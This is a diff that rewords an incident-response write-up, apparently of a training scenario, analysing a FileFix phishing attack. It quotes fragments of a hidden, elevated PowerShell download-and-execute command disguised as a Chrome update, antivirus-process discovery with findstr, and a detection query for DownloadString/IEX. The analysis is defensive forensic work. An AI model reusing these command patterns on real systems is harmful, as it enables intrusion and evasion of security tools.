@@ -56,7 +56,7 @@ The following sections follow the CDSA structure — for each technique: **Descr
 
 ### 3.1 Initial access — phishing lure (Netlify)
 
-**Description.** The user was lured through a benign-looking web search and redirected to an attacker-controlled page abusing a legitimate hosting service (Netlify) — a living-off-trusted-services approach that evades reputation-based filtering.
+**Description.** The user was lured through a web search and redirected to an attacker page hosted on Netlify. Using a legitimate hosting provider gives the domain a good reputation, so it doesn't get flagged by URL-filtering the way a random domain would.
 
 **Execution.** Chrome history (`urls` table, ordered by `last_visit_time DESC`) showed searches for "win iPhone" / "10x iPhone 16 Pro Max" leading to the most recent visited page:
 
@@ -86,11 +86,11 @@ Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList
 # chrome.exe --update --fix --hash=1e693edc-bcc1-4503-b898-7c0b2899d03c
 ```
 
-**Analysis.** The command elevates (`-Verb RunAs`), hides its window (`-WindowStyle Hidden`), bypasses execution policy (`-ExecutionPolicy Bypass -NoProfile`), and downloads-and-executes `rev.ps1` **in memory** via `IEX ... DownloadString`. The trailing `# chrome.exe --update --fix` comment is inert to PowerShell — it exists purely to make the victim believe they are running a Chrome update. This is the defining trait of FileFix: a legitimate binary (`powershell.exe`) launched by the user, so no file is written at delivery and email/EDR heuristics see nothing malicious.
+**Analysis.** The command elevates (`-Verb RunAs`), hides its window (`-WindowStyle Hidden`), bypasses execution policy (`-ExecutionPolicy Bypass -NoProfile`), and downloads-and-executes `rev.ps1` **in memory** via `IEX ... DownloadString`. The trailing `# chrome.exe --update --fix` comment is ignored by PowerShell — it's there so the victim thinks they're running a Chrome update. Because the binary is `powershell.exe` and the user launched it themselves, nothing is written to disk at delivery and email/EDR heuristics have nothing obvious to catch.
 
 ![PowerShell 4104 — recovered FileFix command with the rev.ps1 download](evidence/task04.png)
 
-**Detection.** Command-line inspection is essential — the binary is trusted, only the arguments are malicious. High-fidelity signal: `powershell` with `RunAs` + `Hidden` + `Bypass` + `DownloadString`/`IEX`.
+**Detection.** The detection has to come from the command line, since the binary is trusted and only the arguments are malicious. A reliable signal is `powershell` with `RunAs` + `Hidden` + `Bypass` + `DownloadString`/`IEX` together.
 
 ```
 EventCode=4104 ScriptBlockText="*DownloadString*" ScriptBlockText="*IEX*"
@@ -116,7 +116,7 @@ RuleName:     technique_id=T1036, technique_name=Masquerading
 
 ![Sysmon EID 1 — WindowsUpdate.exe with Product "Virtuoso", T1036 Masquerading](evidence/task0708.png)
 
-**Analysis.** "WindowsUpdate.exe" running from `C:\Windows\Temp\` (a user-writable path, not the legitimate update location) with blank version/company metadata but a `Product` field of **Virtuoso** is a textbook masquerade. The parent chain confirms it descends directly from the FileFix PowerShell command. This ProcessGuid became the pivot for all subsequent child-process analysis.
+**Analysis.** "WindowsUpdate.exe" runs from `C:\Windows\Temp\` — a user-writable path, not where Windows Update actually lives — with blank version and company metadata but a `Product` field of **Virtuoso**. The parent chain ties it directly to the FileFix PowerShell command. This ProcessGuid is the pivot used for the rest of the child-process analysis.
 
 **Detection.** Alert on executables named after system components running from `\Temp\`; correlate `Image` path against expected install locations; pivot on `ProcessGuid` to enumerate child activity.
 
@@ -157,7 +157,7 @@ ParentImage:      C:\Windows\Temp\WindowsUpdate.exe
 07:32:48.933  findstr -I "avastui avgui bdservicehost nswscsvc sophoshealth"  (2nd AV check)
 ```
 
-**Analysis.** The `findstr` argument lists are process names of security products: `wrsa` (Webroot); `avastui`/`avgui` (Avast/AVG), `bdservicehost` (Bitdefender), `nswscsvc` (Norton), `sophoshealth` (Sophos). The classic `tasklist | findstr "<vendor names>"` idiom is a high-confidence discovery signature. Millisecond ordering distinguished the first check from the second — a reminder that in forensics the sub-second timestamps decide sequence.
+**Analysis.** The `findstr` argument lists are process names of security products: `wrsa` (Webroot); `avastui`/`avgui` (Avast/AVG), `bdservicehost` (Bitdefender), `nswscsvc` (Norton), `sophoshealth` (Sophos). The pattern is `tasklist` piped into `findstr` for those names — a clear discovery signal, since nothing legitimate greps the process list for AV vendors. The two `findstr` runs were only 200 ms apart, so I had to order them by their millisecond timestamps to tell which was the second one the task asked for.
 
 ![Sysmon EID 1 — findstr enumerating security-product process names](evidence/task15.png)
 
@@ -302,7 +302,7 @@ Select-String -Path '<triage>\C\$MFT' -Pattern 'sh3rl0ck' -Encoding Unicode
 
 **Short-term**
 - Enforce PowerShell Constrained Language Mode and enable/retain ScriptBlock (4104) and Module logging fleet-wide — 4104 was the source that recovered the initial FileFix command.
-- Restrict access to the File Explorer address bar / Run dialog for standard users via policy where feasible; this is the entire premise of FileFix.
+- Restrict access to the File Explorer address bar / Run dialog for standard users via policy where feasible — that paste step is what FileFix depends on.
 - Deploy command-line auditing (Sysmon + process command-line capture) — every stage here was caught by argument inspection, not binary detection.
 
 **Structural**
@@ -336,10 +336,16 @@ Select-String -Path "<triage>\C\$MFT" -Pattern 'sh3rl0ck' -Encoding Unicode
 
 ---
 
-## 8. Analyst notes / lessons learned
+## 8. Analyst notes
 
-- **The ransom note lived resident in the `$MFT`.** Small text files store their content inline in the MFT record; the note survived there even though the file itself was not collected. When a small text artifact is expected but absent, read the raw `$MFT` — and read it in **both ASCII and Unicode**, since ASCII `findstr` silently skips UTF-16 content.
-- **RunMRU being empty did not mean the attack did not happen.** The FileFix command was not in RunMRU; it was recovered from PowerShell 4104. A single empty artifact never proves absence — the execution leaves a trace somewhere else.
-- **One ProcessGuid unlocked the whole chain.** Pivoting on the `WindowsUpdate.exe` ProcessGuid across Sysmon EID 1/11 reconstructed every subsequent stage (staging, discovery, AutoIt, persistence).
-- **Sub-second timestamps decide order.** The "second" AV-discovery command was resolved by comparing `.733` vs `.933` millisecond UtcTimes, not by list order.
-- **Command-line inspection, not binary detection, caught this attack.** Every stage used trusted binaries (`powershell`, `cmd`, `tasklist`, `findstr`, AutoIt); only the arguments were malicious.
+A few things from working this case that are worth writing down.
+
+Finding the attacker email (the ransom note) took the longest. I looked for it as a `.txt` file first — in the MFT, in the RunMRU registry key, in the PowerShell 4104 logs, in the Chrome downloads. It wasn't in any of them, because KAPE never collected the Temp/staging folders where it was dropped. It turned out the note was stored **resident inside the `$MFT`** — small files keep their content inline in the MFT record rather than in a separate cluster, so it was there even though the file wasn't. The other catch: the content was UTF-16, so a plain `findstr` (which reads ASCII) skipped right over it. Reading the `$MFT` with `Select-String -Encoding Unicode` finally surfaced it. If a small text artifact is expected but missing from the triage, that's the place to look — in both encodings.
+
+RunMRU being empty was a red herring worth noting. The scenario said the command was pasted into File Explorer, so I expected it in RunMRU. It wasn't. But the command still ran, so it left a trace elsewhere (PowerShell 4104). An empty artifact doesn't mean the action didn't happen.
+
+Almost the entire chain came off one identifier: the `WindowsUpdate.exe` ProcessGuid. Filtering Sysmon EID 1 and 11 on that GUID reconstructed the staging, the AV discovery, the AutoIt stage, and the persistence in order.
+
+Two `findstr` AV-discovery commands looked identical until I compared the millisecond timestamps — `.733` vs `.933`. The "second" command depended on that, not on the order the events happened to show up.
+
+Every stage used a trusted binary — `powershell`, `cmd`, `tasklist`, `findstr`, AutoIt. Nothing here would be caught by looking at the binary; it's the command line that gives it away.
